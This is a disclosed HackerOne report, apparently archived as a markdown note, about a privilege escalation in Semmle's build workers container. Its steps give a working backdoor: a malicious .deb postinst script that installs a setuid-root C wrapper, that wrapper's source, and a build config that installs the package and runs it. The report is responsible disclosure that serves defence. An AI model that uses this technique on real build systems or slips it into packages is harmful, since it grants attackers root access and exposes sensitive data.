---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/cloud
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2019-09-25
submitted: 2019-09-11T21:37:46.480Z
bounty_usd: 1500
votes: 206
cve: []
program: "[[programs/semmle|Semmle]]"
reporter: "testanull"
source: "https://hackerone.com/reports/692603"
title: "Privilege escalation in workers container "
---
# Privilege escalation in workers container 

> **Severity:** High | **Bounty:** 1,500 USD | **Votes:** 206 | **Program:** Semmle | **Disclosed:** 2019-09-25

- Report: [https://hackerone.com/reports/692603](https://hackerone.com/reports/692603)
- CWE: Privilege Escalation
- Submitted: 2019-09-11T21:37:46.480Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary about the bugs:
In the prepare step, semmle allows user to install new package.

By upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container

## Steps:

1. Create a malicious package contains the backdoor:

I use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.

With the content of ``postinst`` is

```
#!/bin/sh

ps -ef
sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &

```

Content of ``/opt/src/run``:

```
#include <stdio.h>
void main(int argc, char *argv[]) {
    setreuid(0, 0);
    system(argv[1]);
}
```
After that i will got a malicious ``.deb`` package.

2. Create a config file to install this malicious package:

Because the source code is imported before the ``prepare`` step happens, so i will be able to install this package by point directly to it like this ``/opt/src/work.deb``.

The install command now will be like this ``apt install -y --no-recommend /opt/src/work.deb``. And it is ``legal``.

The build config:
```
extraction:
  java:
    prepare:
      packages:
        - /opt/src/work.deb
    after_prepare:
      - echo pwned >> /opt/out/snapshot/log/build.log
      - /usr/bin/setpasswd 'id'
```
After that the build will failed, and attacker will get root on the container by running the setuid backdoor

## PoC is attached below

Thanks & regard!

## Impact

Attacker will get root access and will be able to dump every sensitive datas in the server!

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2019-09-12** @testanull: Thank you!
- **2019-09-12** @testanull: Can I make this report public?
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
